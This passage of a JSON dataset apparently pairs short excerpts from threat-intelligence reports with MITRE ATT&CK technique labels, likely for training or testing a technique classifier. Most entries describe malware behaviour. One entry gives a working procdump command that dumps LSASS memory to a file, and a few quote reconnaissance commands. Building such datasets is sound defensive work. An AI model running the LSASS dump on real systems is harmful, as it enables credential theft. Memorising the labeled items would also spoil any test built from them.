    "text": "can use Windows API's ConnectNamedPipe and WNetAddConnection2 to detect incoming connections and connect to remote shares.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "create scheduled tasks for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "will search for Windows services that are associated with antivirus software on the system and kill the process. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can save its configuration data as the following RC4-encrypted Registry key: `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon`.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use the WinExec API to execute malware on a compromised host.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "delete files upon completion—including",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "They may also use the wmiexec module from Impacket to execute commands and move across the network.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used tools that communicate with C2 over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "launches a script to delete their original decoy file to cover tracks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "macros can scan for Microsoft Word and Excel files to inject with additional malicious macros.  has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.(Citation: ESET Gamaredon June 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "used several Windows API functions to gather information from the infected system.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can create a shortcut in the Windows startup folder for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Execute commands via Command Prompt",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "obtains a list of running processes through WMI querying and the ps command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to write collected data to a file created in the ./LOGS directory.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label “C:\\” and the computer name",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used batch files that modified registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "runs rundll32.exe to load the malware.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "queries Registry keys in preparation for setting Run keys to achieve persistence.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Configured for WMI persistence",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the username on the compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "by writing to specific registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used a custom tool for creating reverse shells.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to discover the system OS Windows version architecture and environment.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised credentials to obtain unauthorized access to online accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "deploys additional backdoors and hacking tools to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Enumerate files on desktop",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "hide a second stage payload in registry transaction files",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has leveraged several Windows API calls to create processes gather disk information and detect debugger activity.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to execute powershell.exe.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate all logical drives on a targeted machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has relied on victims' opening a malicious file for initial execution.(Citation: SecureWorks August 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "will remove all created artifacts such as dropped executables.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "These platforms may not be well maintained and may break intermittently",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "miner TermsHost.exe evaded defenses by injecting itself into Windows processes including Notepad.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz, which is a tool used for extracting sensitive information such as passwords and authentication credentials from a Windows operating system.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "main method of communicating with its C2 servers is using HTTP or HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can modify registry values within the Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "which is injected to conduct backdoor behaviors.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Persistence for the RAT is achieved via registry entry, and a shortcut to the installed RAT executable is written to the Startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "injects the payload in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.(Citation: Moran 2014)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can download files and additional malware components.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "obtains the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The webshell will save the archives locally to the server in the C:\\Users\\Public\\Libraries\\Recorded\\Files folder, each with a filename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]-[seconds].7z It is likely that the threat actors use this functionality to rapidly check for new files created by users on the network",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has collected the user name from a compromised host using `GetUserNameA`.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the ‘Powershell.exe’ process initiated the WMI requests.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "using privileged accounts and then accessed the wiki using a different set of credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "gathers the victim computer name using the Win32 API call GetComputerName.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "download multiple tools",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "is capable of manipulating the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "utilising similar API calls,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses Windows services typically named javamtsup for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `ipconfig` `nbtstat` `tracert` `route print` and `cat /etc/hosts` commands.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "obtains additional code to execute on the victim's machine including the downloading of a secondary payload.(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy May 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can call multiple Windows API functions used for privilege escalation service execution and to overwrite random bites of data.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wizard March 2022)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use scheduled tasks for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can collect the OS version architecture information and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "uses a custom command and control protocol that can be encapsulated in HTTP or HTTPS or DNS. All protocols use their standard assigned ports.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected various files from the compromised computers.(Citation: DOJ APT10 Dec 2018)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover drive information on the infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded binary data from a specified domain after the malicious document is opened.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete files and directories.(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy May 2019)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "injecting the shellcode into rundll32.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "calls the VirtualProtect function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "creates a startup item for persistence. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The BAT script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "deletes,",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "gathers system information network addresses disk type disk free space and the operation system version.(Citation: McAfee Bankshot)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to uninstall malware from the infected host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the malware proceeds to identify files and directories for encryption by iterating through them",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has collected the username from the victim's machine. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "enumerates directories and obtains file attributes on a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "and then deletes the original launcher",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "to fool potential victims into opening them.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "contains a command to collect the victim MAC address and LAN IP.(Citation: Proofpoint Operation Transparent Tribe March 2016)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a command to collect the processor type operation system computer name uptime and whether the system is a laptop or PC.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised Office 365 accounts in tandem with  in an attempt to gain control of endpoints.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "transfers files from the compromised host via HTTP or HTTPS to a C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "installation has been immediately preceded by a task kill command in order to disable anti-virus.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for Command & Control.(Citation: ESET Machete July 2019)(Citation: Cylance Machete Mar 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the system's computer name and also has the capability to collect information on the processor memory OS and video card from the system.(Citation: Fortinet Agent Tesla April 2018)(Citation: Fortinet Agent Tesla June 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has tested connectivity between a compromised machine and a C2 server using  with commands such as `CSIDL_SYSTEM\\cmd.exe /c ping -n 1`.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can list directories on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "by listing accessible local IPs",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can attempt to stop security software.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to launch files using ShellExecute.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "creates several tasks for later execution to continue persistence on the victims machine.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The emulated C2 Server is now running an HTTPS server",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "C:\\programdata\\procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Disabling Windows Defender notifications, Disabling Task Manager, Disabling command prompt, Preventing users from accessing Windows registry tools, Disabling Run command, Modifying the display timeout",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised local accounts to access victims' networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for C2.(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy May 2019)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a scheduled task to establish persistence for a keylogger.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware to execute on the victim's machine including by using a PowerShell script to launch shellcode that retrieves an additional payload.(Citation: FireEye FIN7 April 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can identify the IP address of the victim system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used shellcode to download Meterpreter after compromising a victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The second stage payload, which was later determined to likely be the penetration testing framework \"Brute Ratel,\" was then downloaded via a connection",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used several API calls like `GetLogicalDriveStrings` `SleepEx` `SystemParametersInfoAPI` `CryptEncrypt` and others to execute parts of its attack.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to download backdoor tools.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "a BAT file (4.2) to be run on logon as another UI shell",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "creates the service mssecsvc2.0 with the display name Microsoft Security Center (2.0) Service.(Citation: LogRhythm WannaCry)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Process dump of the LSASS process",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "IPv4 addresses",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has a command to collect the victim's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "used the ipconfig /all command to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "There were several variants of Mimikatz in binary and PowerShell form",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "they will be able to download the decryptor",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can launch command-line shells.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can gather Registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can discover files on a local system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect a variety of information from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used Remote Desktop Protocol to conduct lateral movement.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "downloaded additional payloads after a target was infected with a first-stage downloader.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download additional payloads from the C2. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An endpoint with a system injected",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "collects the CPU information OS information and system language.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can detect and terminate active security software-related processes on infected systems.(Citation: TrendMicro Netwalker May 2020)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used batch files for execution and can launch Internet Explorer from cmd.exe.(Citation: JoeSecurity Egregor 2020) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the “Hardware UUID” listed in the system information application, as seen in the Figure 3 screenshot of our analysis system",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Rundll32.exe is used as a way of executing  at the command-line.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can copy specific files webcam captures and screenshots to local directories.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "run the scheduled task every 2 minutes is  start.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "supports execution from the command-line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a “!Hello” message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used the command appDir=$(dirname $(dirname $currentDir)) and $(dirname $(pwd -P)) to construct installation paths.(Citation: sentinelone shlayer to zshlayer)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "File deletion functions",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands on victims.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the system volume information of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can start and inject code into a new `svchost` process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The  Server Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download files via HTTP and HTTPS.(Citation: NCSC Cyclops Blink February 2022)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP GET and POST requests over port 443 for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims into executing malware via malicious e-mail attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "deleted installation files after completion.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used the Registry to store encrypted payloads.(Citation: ESET Turla PowerShell May 2019)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "then collects the credentials, host information, files,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can inject into a target process using process doppelgnging.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension name and/or age)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "they’re downloaded from the C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The discovery modules used with  can collect information on process details.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has discovered the username of the user running the backdoor.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has created a scheduled task to execute additional malicious software as well as maintain persistence.(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has searched for the current processs PID.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "whoami.exe",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "through the command line as",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "malicious OneNote documents to entice users to click on an embedded file to download and execute",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "communicates over HTTP to retrieve a string that is decoded into a C2 server URL.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to gather the victim's proxy information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "features multiple flags that could be set as command line arguments",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has uploaded files from victims' machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The final execution method Hancitor supports is Thread Execution Hijacking.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "server component executes code sent via HTTP POST commands.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through malicious e-mail attachments ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "is capable of identifying documents on the victim with the following extensions: .doc; .pdf .csv .ppt .docx .pst .xls .xlsx .pptx and .jpeg.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.(Citation: Cybereason Oceanlotus May 2017)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "to report some basic information about the compromised system",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has gathered a process list by using .exe.(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use ImprovedReflectiveDLLInjection to deploy components. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to execute a loader.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "used the WMIEXEC utility to execute whoami commands on remote machines.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can create a reverse shell on the infected endpoint using cmd.exe.  has been executed via malicious macros.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "files that where downloaded from those sites:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can list running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has deleted the MSI file after installation.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional files.(Citation: Cybereason Molerats Dec 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands remotely by creating a new schedule task on the remote system",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "file would execute a batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used RDP for lateral movement.(Citation: FireEye APT41 Aug 2019)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers the Mac address IP address and the network adapter information from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "stages data prior to exfiltration in multi-part archives often saved in the Recycle Bin.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can be used to act on (ex: copy move etc.) files/directories in a system during (ex: copy files into a staging area before).",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to communicate with C2 over HTTP.(Citation: Malwarebytes Kimsuky June 2021)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Registry keys changed",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This executable uses the Windows Native API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "is capable of executing commands and spawning a reverse shell.",
